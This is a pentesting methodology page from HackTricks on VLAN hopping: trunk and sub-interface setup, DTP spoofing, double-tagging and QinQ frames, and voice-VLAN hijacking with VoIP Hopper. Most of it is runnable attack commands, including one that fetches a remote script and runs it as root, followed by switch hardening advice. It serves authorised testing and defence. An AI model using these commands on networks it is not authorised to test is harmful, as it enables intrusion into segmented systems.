---
title: "Lateral VLAN Segmentation Bypass"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/generic-methodologies-and-resources/pentesting-network/lateral-vlan-segmentation-bypass.html
fetched_at: 2026-09-20T08:53:25Z
license: unspecified
category: network
---

```
SW1(config)# show mac address-table | include 0050.0000.0500
```
```
SW1# show vlan brief
```
```
SW1(config)# interface GigabitEthernet 0/2
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk
```
```
# Legacy (vconfig) – still works but deprecated in modern kernels
sudo vconfig add eth0 10
sudo vconfig add eth0 20
sudo vconfig add eth0 50
sudo vconfig add eth0 60
sudo ifconfig eth0.10 up
sudo ifconfig eth0.20 up
sudo ifconfig eth0.50 up
sudo ifconfig eth0.60 up
# Modern (ip-link – preferred)
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set eth0.10 up
sudo ip link set eth0.20 up
sudo dhclient -v eth0.50
sudo dhclient -v eth0.60
```
```
sudo dhclient -v eth0.10
sudo dhclient -v eth0.20
```
```
sudo ifconfig eth0.10 10.10.10.66 netmask 255.255.255.0
# or
sudo ip addr add 10.10.10.66/24 dev eth0.10
```
## Other VLAN-Hopping Techniques (no privileged switch CLI)

The previous method assumes authenticated console or Telnet/SSH access to the switch.  In real-world engagements the attacker is usually connected to a **regular access port**.  The following Layer-2 tricks often let you pivot laterally without ever logging into the switch OS:

### 1. Switch-Spoofing with Dynamic Trunking Protocol (DTP)

On a Cisco port left in a DTP-negotiating mode, a host can send DTP frames that cause trunk negotiation and expose the VLANs allowed on the resulting trunk.  A static access port, optionally with `switchport nonegotiate`, prevents this; the exact result depends on both port modes.[\[3\]](#references)[\[7\]](#references)

*Yersinia* can send DTP packets and enable trunking, while the `dtp-spoof` project provides a PoC for testing this configuration:[\[9\]](#references)[\[10\]](#references)

```
# Become a trunk using Yersinia (GUI)
sudo yersinia -G          # Launch GUI → Launch attack → DTP → enabling trunking
# Python PoC (dtp-spoof)
git clone https://github.com/fleetcaptain/dtp-spoof.git
sudo python3 dtp-spoof/dtp-spoof.py -i eth0 --desirable
```
The following helper passively fingerprints the port’s DTP state:[\[11\]](#references)

```
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.30 type vlan id 30
sudo ip addr add 10.10.30.66/24 dev eth0.30
sudo ip link set eth0.30 up
# or
wget https://gist.githubusercontent.com/mgeeky/3f678d385984ba0377299a844fb793fa/raw/dtpscan.py
# dtpscan.py uses Scapy's default interface; set it in the script if needed.
sudo python3 dtpscan.py
```
Once the port switches to trunk you can create 802.1Q sub-interfaces and pivot exactly as shown in the previous section.

### 2. Double-Tagging (Native-VLAN Abuse)

Double tagging requires specific topology and switch behavior.  If the first switch accepts tagged frames from the access or voice port, the outer tag matches its native VLAN, and a downstream trunk forwards the inner tag, a frame with *two* 802.1Q headers may reach a second VLAN.  Many current switches discard tagged frames arriving on an access port without a voice VLAN, so this is not a universal access-port bypass.[\[3\]](#references)[\[8\]](#references)**VLANPWN DoubleTagging.py** automates the injection:[\[2\]](#references)

```
python3 DoubleTagging.py \
        --interface eth0 \
        --nativevlan 1 \
        --targetvlan 20 \
        --victim 10.10.20.24 \
        --attacker 10.10.1.54
```
### 3. QinQ (802.1ad) Stacking

QinQ/802.1ad is provider bridging, not a general access-port bypass.  On a customer-facing UNI that is intentionally configured to accept stacked tags, traffic can carry an inner C-tag inside an outer S-tag (`0x88a8`); test only where the provider or enterprise configuration permits it.<sup>[\[12\]](#references)[\[13\]](#references)</sup>  A Scapy lab frame is:

```
from scapy.all import *
outer = 100  # Service tag
inner = 30   # Customer / target VLAN
frame = Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1AD(vlan=outer)/Dot1Q(vlan=inner)/IP(dst="10.10.30.1")/ICMP()
sendp(frame, iface="eth0")
```
### 4. Voice-VLAN Hijacking via LLDP/CDP (IP-Phone Spoofing)

Corporate access ports often sit in an *“access + voice”* configuration: untagged data VLAN for the workstation and a tagged voice VLAN advertised through CDP or LLDP-MED.  By impersonating an IP phone the attacker can automatically discover and hop into the VoIP VLAN—even when DTP is disabled.

*VoIP Hopper* is available as a Kali package and supports CDP, DHCP options **176/242**, and LLDP-MED discovery/spoofing:[\[4\]](#references)[\[14\]](#references)

```
# CDP spoofing (replace the phone identity fields for your test)
sudo voiphopper -i eth0 -c 1 -E 'SEP0070EEA5086' -P 'Port 1' -C Host \
        -L 'Cisco IP Phone 7940' -S 'P00308000700' -U 1
# Interactive assessment mode (passive sniff → auto-hop when a VVID is learned)
sudo voiphopper -i eth0 -z
# Result: new sub-interface eth0.<VVID> with a DHCP or static address inside the voice VLAN
```
Whether this works depends on CDP/LLDP-MED exposure, voice-VLAN policy, DHCP behavior, and port-security controls.[\[4\]](#references)

## Defensive Recommendations

1. Disable DTP on all user-facing ports: `switchport mode access` +`switchport nonegotiate` .
2. Change the native VLAN on every trunk to an **unused, black-hole VLAN** and tag it:`vlan dot1q tag native` .
3. Prune unnecessary VLANs on trunks: `switchport trunk allowed vlan 10,20` .
4. Enforce port security, DHCP snooping, dynamic ARP inspection **and 802.1X** to limit rogue Layer-2 activity.
5. Disable LLDP-MED auto voice policies (or lock them to authenticated MAC OUIs) if IP-phone spoofing isn’t required.
6. Prefer private-VLANs or L3 segmentation instead of relying solely on 802.1Q separation.

## Real-World Vendor Vulnerabilities (2022-2024)

Even a perfectly hardened switch configuration can still be undermined by firmware bugs. Recent examples include:

- **CVE-2022-20728** – On affected Cisco Aironet/Catalyst access points, an unauthenticated adjacent attacker with native-VLAN access can inject packets toward clients in nonnative VLANs, bypassing VLAN and Layer 3 protections.<sup>[\[5\]](#references)</sup>
- **CVE-2024-20465** – On affected Cisco Industrial Ethernet 4000/4010/5000 switches, enabling and then disabling REP can leave IPv4 ACLs on SVIs unenforced, allowing an unauthenticated remote attacker to bypass them.  Cisco lists no workaround and directs operators to its Software Checker for fixed releases.<sup>[\[6\]](#references)</sup>

Always monitor the vendor advisories for VLAN-related bypass/ACL issues and keep infrastructure images current.

## References

- [1] [Cisco Nightmare: Pentesting Cisco Networks Like a Devil](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [2] [VLANPWN attack toolkit](https://github.com/casterbytethrowback/VLANPWN)
- [3] [Twingate: What is VLAN Hopping? (Aug 2024)](https://www.twingate.com/blog/glossary/vlan%20hopping)
- [4] [VoIP Hopper project](https://github.com/hmgh0st/voiphopper)
- [5] [Cisco Advisory “cisco-sa-apvlan-TDTtb4FY”](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apvlan-TDTtb4FY)
- [6] [Cisco Advisory “cisco-sa-repacl-9eXgnBpD” (CVE-2024-20465)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-repacl-9eXgnBpD)
- [7] [Cisco VLAN Trunking Configuration Guide](https://www.cisco.com/c/en/us/td/docs/switches/lan/c9000/lyr2-fwd/vlan/vlan-configuration-guide/configure-vlan-trunks.html)
- [8] [Cisco: External Layer 2 Switching Domain Connected to an SD-Access Edge Node](https://community.cisco.com/kxiwq67737/attachments/kxiwq67737/discussions-sd-access/2344/1/External_Layer_2_Switching_Domain_Connected_to_SD-Access_Edge_Node.pdf)
- [9] [dtp-spoof project](https://github.com/fleetcaptain/dtp-spoof)
- [10] [Yersinia attacks](https://yersinia.sourceforge.net/attacks.html)
- [11] [DTP scan helper](https://gist.githubusercontent.com/mgeeky/3f678d385984ba0377299a844fb793fa/raw/dtpscan.py)
- [12] [Scapy Layer 2 API](https://scapy.readthedocs.io/en/stable/api/scapy.layers.l2.html)
- [13] [Cisco IEEE 802.1ad Configuration Guide](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/cether/configuration/xe-3s/asr903/16-12-1/b-ce-xe-16-12-asr900/m_ce_802_1ad_900.html)
- [14] [VoIP Hopper - Kali Linux Tools](https://www.kali.org/tools/voiphopper/)
